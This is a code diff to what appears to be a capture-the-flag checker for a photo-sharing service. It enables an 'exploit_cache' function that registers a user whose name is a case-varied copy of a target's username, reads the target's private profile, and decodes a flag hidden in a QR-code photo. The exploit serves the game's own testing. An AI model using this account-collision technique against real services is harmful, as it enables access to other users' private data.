@@ -1,3 +1,4 @@
+from dataclasses import replace
 from threads import run_in_thread
 import time
 import httpx
@@ -174,9 +175,6 @@ async def get_dont_show_flag(
     cookies = await user.login(conn, u)
     profile = await user.get_profile(conn, u.name, cookies)
     pid: str = photo.get_by_description_contains(profile, p.description).public_id
-
-    logger.info("qwer")
-    logger.info(f"{profile=}")
 
     p: Photo = await photo.get(conn, pid)
     data = await photo.get_data_public(conn, p.asset_id)
@@ -377,30 +375,32 @@ async def exploit_censor(
     return qr.decode(img)
 
 
-# @checker.exploit(1)
-# async def exploit_cache(
-#     task: ExploitCheckerTaskMessage,
-#     searcher: FlagSearcher,
-#     conn: Connection,
-#     logger: LoggerAdapter,
-# ):
-#     assert task.attack_info is not None
-#     username = task.attack_info
+@checker.exploit(1)
+async def exploit_cache(
+    task: ExploitCheckerTaskMessage,
+    searcher: FlagSearcher,
+    conn: Connection,
+    logger: LoggerAdapter,
+):
+    assert task.attack_info is not None
+    username = task.attack_info
 
-#     u: User = user.random_user()
-#     cookies = await user.register(conn, u)
+    u: User = user.random_user()
+    cookies = await user.register(conn, u)
 
-#     nu = u
-#     nu.name = utils.random_capitalize(username)
+    nu = replace(u, name=utils.random_capitalize(username))
 
-#     await user.update(conn, nu, cookies)
-#     profile = await user.get_profile(conn, nu.name)
+    await user.update(conn, nu, cookies)
+    profile = await user.get_profile(conn, nu.name, cookies)
 
-#     logger.info("asdf")
+    pid: Photo = photo.get_by_description_contains(
+        profile, "could be a flag but you cant see it"
+    ).public_id
+    p: Photo = await photo.get(conn, pid)
 
-#     logger.info(f"{profile=}")
+    data = await photo.get_data_public(conn, p.asset_id, cookies)
 
-#     return username
+    return qr.decode(data)
 
 
 if __name__ == "__main__":
